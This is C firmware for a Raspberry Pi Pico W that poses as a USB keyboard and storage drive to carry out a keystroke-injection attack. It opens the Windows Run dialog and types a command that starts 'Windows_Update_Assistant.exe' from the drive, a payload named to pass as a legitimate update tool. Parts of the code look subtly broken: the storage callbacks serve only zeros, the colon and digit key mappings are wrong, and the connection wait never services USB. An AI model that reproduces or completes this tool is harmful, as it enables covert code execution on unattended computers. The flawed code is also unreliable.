#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "pico/stdlib.h"
#include "pico/binary_info.h"
#include "hardware/spi.h"
#include "tusb.h"

// ===== YOUR EXACT WIRING =====
// SD Card Module → Pico W GPIO
#define SPI_PORT spi0
#define PIN_MISO 6   // GP6  (SD MISO → Pico GP6)
#define PIN_CS   5   // GP5  (SD CS   → Pico GP5)  
#define PIN_SCK  4   // GP4  (SD SCK  → Pico GP4)
#define PIN_MOSI 7   // GP7  (SD MOSI → Pico GP7)
// =============================

// HID Keyboard report
uint8_t keycode[6] = {0};
uint8_t modifier = 0;

// Simple mass storage buffer (no FatFs)
uint8_t msd_buffer[512];
bool msd_ready = false;

// SD Card initialization (simplified)
bool sd_card_init() {
    printf("Initializing SD card with your wiring...\n");
    printf("MISO: GP%d, MOSI: GP%d, SCK: GP%d, CS: GP%d\n", 
           PIN_MISO, PIN_MOSI, PIN_SCK, PIN_CS);
    
    // Initialize SPI
    spi_init(SPI_PORT, 1000 * 1000);
    
    gpio_set_function(PIN_MISO, GPIO_FUNC_SPI);
    gpio_set_function(PIN_MOSI, GPIO_FUNC_SPI);
    gpio_set_function(PIN_SCK, GPIO_FUNC_SPI);
    
    gpio_init(PIN_CS);
    gpio_set_dir(PIN_CS, GPIO_OUT);
    gpio_put(PIN_CS, 1);
    
    printf("SD card SPI initialized\n");
    return true;
}

// ===== Mass Storage Callbacks (Simplified) =====
int32_t tud_msc_read10_cb(uint8_t lun, uint32_t lba, uint32_t offset, void* buffer, uint32_t bufsize) {
    printf("MSD Read: lba=%lu, size=%lu\n", lba, bufsize);
    
    // Return empty data for now
    memset(buffer, 0, bufsize);
    return bufsize;
}

int32_t tud_msc_write10_cb(uint8_t lun, uint32_t lba, uint32_t offset, uint8_t* buffer, uint32_t bufsize) {
    printf("MSD Write: lba=%lu, size=%lu\n", lba, bufsize);
    return bufsize;
}

bool tud_msc_is_writable_cb(uint8_t lun) {
    return true;
}

int32_t tud_msc_capacity_cb(uint8_t lun, uint32_t* block_count, uint16_t* block_size) {
    *block_size = 512;
    *block_count = 32768; // 16MB capacity
    printf("MSD Capacity: %lu blocks\n", *block_count);
    msd_ready = true;
    return 0;
}

// ===== HID Keyboard Functions =====
void send_keystrokes() {
    printf("Starting keystroke injection...\n");
    
    // Wait for USB to be ready
    while (!tud_hid_ready()) {
        sleep_ms(10);
    }
    
    // Wait for mass storage to be ready
    printf("Waiting for mass storage...\n");
    for (int i = 0; i < 100 && !msd_ready; i++) {
        sleep_ms(100);
    }
    
    // Additional delay for Windows to recognize the drive
    sleep_ms(5000);
    
    // Send Win+R
    printf("Sending Win+R\n");
    modifier = KEYBOARD_MODIFIER_LEFTGUI;
    keycode[0] = HID_KEY_R;
    
    tud_hid_keyboard_report(0, modifier, keycode);
    sleep_ms(100);
    tud_hid_keyboard_report(0, 0, NULL);
    sleep_ms(500);
    
    // Type the command
    printf("Typing command...\n");
    const char* command = "start D:\\Windows_Update_Assistant.exe";
    
    for (int i = 0; command[i] != 0; i++) {
        uint8_t kc = 0;
        char ch = command[i];
        
        // Simple character mapping
        if (ch >= 'a' && ch <= 'z') kc = HID_KEY_A + (ch - 'a');
        else if (ch >= 'A' && ch <= 'Z') kc = HID_KEY_A + (ch - 'A');
        else if (ch >= '0' && ch <= '9') kc = HID_KEY_0 + (ch - '0');
        else if (ch == ' ') kc = HID_KEY_SPACE;
        else if (ch == ':') kc = HID_KEY_SEMICOLON;
        else if (ch == '\\') kc = HID_KEY_BACKSLASH;
        else if (ch == '.') kc = HID_KEY_PERIOD;
        else if (ch == '_') { modifier = KEYBOARD_MODIFIER_LEFTSHIFT; kc = HID_KEY_MINUS; }
        else if (ch == '/') kc = HID_KEY_SLASH;
        else continue;
        
        tud_hid_keyboard_report(0, modifier, &kc);
        sleep_ms(50);
        tud_hid_keyboard_report(0, 0, NULL);
        sleep_ms(50);
        modifier = 0;
    }
    
    // Press Enter
    printf("Pressing Enter\n");
    keycode[0] = HID_KEY_ENTER;
    tud_hid_keyboard_report(0, 0, keycode);
    sleep_ms(50);
    tud_hid_keyboard_report(0, 0, NULL);
    
    printf("Keystrokes sent!\n");
}

// HID descriptor
uint8_t const desc_hid_report[] = {
    TUD_HID_REPORT_DESC_KEYBOARD()
};

// HID callbacks
uint16_t tud_hid_get_report_cb(uint8_t instance, uint8_t report_id, hid_report_type_t report_type, uint8_t* buffer, uint16_t reqlen) {
    return 0;
}

void tud_hid_set_report_cb(uint8_t instance, uint8_t report_id, hid_report_type_t report_type, uint8_t const* buffer, uint16_t bufsize) {
}

void tud_hid_set_idle_cb(uint8_t instance, uint8_t idle_rate) {
}

void tud_hid_set_protocol_cb(uint8_t instance, uint8_t protocol) {
}

uint8_t const *tud_hid_descriptor_report_cb(uint8_t instance) {
    return desc_hid_report;
}

// Main function
int main() {
    stdio_init_all();
    printf("=== Pico HID + Mass Storage ===\n");
    
    // Initialize SD card
    sd_card_init();
    
    // Initialize USB
    tusb_init();
    
    // Wait for USB connection
    while (!tud_connected()) {
        sleep_ms(100);
    }
    printf("USB Connected!\n");
    
    // Send keystrokes
    send_keystrokes();
    
    // Main loop
    while (1) {
        tud_task();
        sleep_ms(1);
    }
    
    return 0;
}
